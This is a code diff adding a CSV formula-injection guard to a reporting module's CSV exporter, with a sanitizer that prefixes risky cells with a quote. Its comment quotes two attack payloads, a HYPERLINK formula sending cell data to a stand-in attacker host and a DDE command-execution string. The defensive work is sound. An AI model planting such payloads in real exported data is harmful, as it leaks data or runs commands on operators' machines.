@@ -1684,6 +1684,21 @@ router.get('/margin-trends', requireFeature('advancedReports'), asyncHandler(asy
 // Helper: convert array of objects to CSV string.
 // RPT-CSV1: Always emit the header row even when rows is empty so that an
 // empty-period export opens in Excel with column labels instead of a blank file.
+// SCAN-1130 [HIGH]: CSV formula-injection guard. Excel / LibreOffice Calc /
+// Google Sheets evaluate any cell whose first character is `=`, `+`, `-`,
+// `@`, a tab, or a carriage return as a formula. An attacker who controls a
+// field that ends up in a report (customer name, ticket notes, device name
+// etc.) can ship a payload like `=HYPERLINK("http://attacker/?" & A1)` or
+// `=cmd|' /C calc'!A0` that runs when an operator opens the CSV. Prefix the
+// offender with a single quote — a widely-documented defensive convention
+// that every spreadsheet treats as "render as literal, do not evaluate".
+// The quote is stripped during normal view; round-tripping back through a
+// parser re-adds it automatically because the cell is now quoted.
+const CSV_FORMULA_TRIGGERS = /^[=+\-@\t\r]/;
+function sanitizeCsvCell(str: string): string {
+  return CSV_FORMULA_TRIGGERS.test(str) ? `'${str}` : str;
+}
+
 function toCsv(rows: Record<string, unknown>[], knownHeaders?: string[]): string {
   const headers = knownHeaders ?? (rows.length > 0 ? Object.keys(rows[0]) : []);
   if (headers.length === 0) return '';
@@ -1693,7 +1708,7 @@ function toCsv(rows: Record<string, unknown>[], knownHeaders?: string[]): string
     const values = headers.map(h => {
       const val = row[h];
       if (val == null) return '';
-      const str = String(val);
+      const str = sanitizeCsvCell(String(val));
       // Escape fields containing commas, quotes, or newlines
       if (str.includes(',') || str.includes('"') || str.includes('\n')) {
         return '"' + str.replace(/"/g, '""') + '"';
